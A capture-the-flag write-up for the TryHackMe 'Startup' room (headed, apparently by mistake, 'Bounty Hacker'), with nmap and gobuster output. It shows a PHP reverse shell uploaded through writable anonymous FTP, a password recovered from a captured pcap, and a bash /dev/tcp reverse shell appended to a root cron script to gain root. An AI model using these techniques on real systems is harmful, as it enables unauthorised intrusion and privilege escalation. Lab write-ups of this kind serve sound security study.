# THM: Bounty Hacker

| Stat | Value |
| ---------- | -------------------------------------------- |
| Image | <img src="../../images/write_ups/try_hack_me/startup/startup.png" alt="Startup" width="90"/> |
| Room | Startup |
| URL | https://tryhackme.com/room/startup |
| Difficulty | Easy |

## Concepts/Tools Used

- [ftp](../tools/ftp.md)
- [gobuster](../tools/gobuster.md)
- Wireshark

## Room Description

Abuse traditional vulnerabilities via untraditional means.

## Process

Once the machine starts up I save the machine's ip address to my host file so that I can type `target.thm` instead of an ip address.

I run nmap to see what ports are open:

```bash
$ nmap -T4 -n -sC -sV -Pn -p- target.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-07 18:11 BST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 18:11
Completed NSE at 18:11, 0.00s elapsed
Initiating NSE at 18:11
Completed NSE at 18:11, 0.00s elapsed
Initiating NSE at 18:11
Completed NSE at 18:11, 0.00s elapsed
Initiating ARP Ping Scan at 18:11
Scanning target.thm (10.10.228.95) [1 port]
Completed ARP Ping Scan at 18:11, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 18:11
Scanning target.thm (10.10.228.95) [65535 ports]
Discovered open port 21/tcp on 10.10.228.95
Discovered open port 80/tcp on 10.10.228.95
Discovered open port 22/tcp on 10.10.228.95
Completed SYN Stealth Scan at 18:11, 2.69s elapsed (65535 total ports)
Initiating Service scan at 18:11
Scanning 3 services on target.thm (10.10.228.95)
Completed Service scan at 18:11, 6.01s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.228.95.
Initiating NSE at 18:11
NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
Completed NSE at 18:11, 0.31s elapsed
Initiating NSE at 18:11
Completed NSE at 18:11, 0.01s elapsed
Initiating NSE at 18:11
Completed NSE at 18:11, 0.00s elapsed
Nmap scan report for target.thm (10.10.228.95)
Host is up (0.00023s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.226.27
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
MAC Address: 02:14:8D:9F:FE:7B (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 18:11
Completed NSE at 18:11, 0.00s elapsed
Initiating NSE at 18:11
Completed NSE at 18:11, 0.00s elapsed
Initiating NSE at 18:11
Completed NSE at 18:11, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.63 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

From the output above, the ftp server allows the ftp user to log in. I connect to the ftp service and look around:

```bash
$ ftp target.thm
Connected to target.thm.
220 (vsFTPd 3.0.3)
Name (target.thm:root): ftp
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lha
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
-rw-r--r--    1 0        0               5 Nov 12  2020 .test.log
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> get notice.txt -
remote: notice.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for notice.txt (208 bytes).
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
226 Transfer complete.
208 bytes received in 0.00 secs (224.6958 kB/s)
ftp> get important.jpg
local: important.jpg remote: important.jpg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for important.jpg (251631 bytes).
226 Transfer complete.
251631 bytes received in 0.00 secs (70.6221 MB/s)
ftp> cd ftp
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -lha
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
226 Directory send OK.
ftp> cd ..
250 Directory successfully changed.
ftp> get .test.log -
remote: .test.log
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .test.log (5 bytes).
test
226 Transfer complete.
5 bytes received in 0.00 secs (3.0067 kB/s)
```

The notice.txt file mentions a possible username (maya). I downloaded the important.jpg image to run the gambit of binaries on it (exiftool, binwalk and steghide). I didn't find anything.

I noticed that the ftp folder doesn't have anything in it but I noticed I can write to this directory.

I next checked the website and couldn't find much. I decided to run gobuster to see if I could find other directories. Here is the command:

```bash
$ gobuster dir -u http://target.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,zip,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/files                (Status: 301) [Size: 308] [--> http://target.thm/files/]
/.php                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 830572 / 830576 (100.00%)
===============================================================
Finished
===============================================================
```

## Getting a Foothold

I went to http://target.thm/files and it matches what is in the ftp folder on the ftp server. This means that I can upload a reverse shell using ftp and then have the webserver execute it.

I run the following command to put the php reverse shell in my directory:

```bash
$ /usr/share/webshells/php/php-reverse-shell.php shell.php
```

I alter the shell.php file with the attack machine's ip address and port 4444.

I connect to the ftp server and upload the file:

```bash
$ ftp target.thm
Connected to target.thm.
220 (vsFTPd 3.0.3)
Name (target.thm:root): ftp
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd ftp
250 Directory successfully changed.
ftp> put shell.php
local: shell.php remote: shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5494 bytes sent in 0.00 secs (137.8812 MB/s)
```

I setup a listener on the attack machine by running:

```bash
$ nc -lnvp 4444
```

I then visited http://target.thm/files/ftp/shell.php

I have a shell. I'm in!

## What is the secret spicy soup recipe?

I get a stable shell using the [guide found here](../README.md#stable-shell).

The current folder is the root folder (/). I look around the folder and I see a file called recipe.txt. I run the cat command on the file and get the first flag:

```bash
$ cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was REDACTED.
```

## What are the contents of user.txt?

The 

I tried my usual list of [privilege escalation commands](../concepts/privilege_escalation.md#linux-privilege-escalation), the main thing that I found was the home directory for lennie.

I looked around a few other directories and couldn't find anything. I ran [LinPEAS](../tools/linpeas.md) from the /tmp directory. It found some interesting files:

- /etc/skel/.bashrc
- /etc/skel/.profile
- /incidents/suspicious.pcapng

I couldn't recall ever seeing the the skel folder so I used cat on those files. It didn't yield anything useful. However, I went to the /incidents folder so that I could copy the suspicious.pcapng file to my attack machine and view it with Wireshark. Here are the commands I ran from my target box:

```bash
$ cd incidents
$ python3 -m http.server
```

Then on my attack machine I ran the following to download the suspicious.pcapng file:

```bash
$ wget http://target.thm:8000/suspicious.pcapng
```

I opened up the suspicious.pcapng file with Wireshark and started checking each of the packets. Packet 45 was where things got interesting. I right clicked the package and clicked Follow > TCP Stream.

From the dialog that popped up I could see a password:

```text
www-data@startup:/home$ 
ls

ls
lennie
www-data@startup:/home$ 
cd lennie

cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ 
sudo -l

sudo -l
[sudo] password for www-data: 
REDACTED
```

I switched to the lennie user with that password and the following command:

```bash
$ su lennie
```

I couldn't go into lennie's home directory before, now that I am lennie I went to their home directory:

```bash
$ cd ~
$ ls
total 20K
drwx------ 4 lennie lennie 4.0K Nov 12  2020 .
drwxr-xr-x 3 root   root   4.0K Nov 12  2020 ..
drwxr-xr-x 2 lennie lennie 4.0K Nov 12  2020 Documents
drwxr-xr-x 2 root   root   4.0K Nov 12  2020 scripts
-rw-r--r-- 1 lennie lennie   38 Nov 12  2020 user.txt
$ cat user.txt
REDACTED
```

## What are the contents of root.txt?

The scripts directory has a couple of files in it:

```bash
$ ls -lh
drwxr-xr-x 2 root   root   4.0K Nov 12  2020 .
drwx------ 4 lennie lennie 4.0K Nov 12  2020 ..
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 Jul  8 14:19 startup_list.txt
```

The startup_list.txt file is empty but the planner.sh has the following content:

```bash
$ cat scripts/planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

This script (scripts/planner.sh) calls the /etc/print.sh script. I check who owns that file:

```bash
$ ls -lha /etc/print.sh
-rwx------ 1 lennie lennie 68 Jul  7 18:03 /etc/print.sh
```

I feel confident that the /home/lennie/scripts/planner.sh file is ran as a cron by root since it is owned by them. Going with the idea that root is running that file as a cron, I can think of two ways to escalate privileges. The first approach is to delete the scripts folder in lennie's home directory and recreate it with a modified planner.sh script. The second approach is to alter the /etc/print.sh script.

I went with the second choice since it only involves altering a single file.

On my attack machine I setup a listener with the following command:

```bash
$ nc -lnvp 4445
```

On the target machine I append the following to the /etc/print.sh file:

```bash
$ echo "bash -i >& /dev/tcp/<attack_box_ip>/4445 0>&1" >> /etc/print.sh
$ cat /etc/print
#!/bin/bash
echo "Done!"
bash -i >& /dev/tcp/<attack_box_ip>/4445 0>&1
```

Now I wait a minute for a connection.

It worked. I'm in! The cursor changed to the # character to let me know that I am root. I ran the following to get the flag:

```bash
# cat /root/root.txt
REDACTED
```
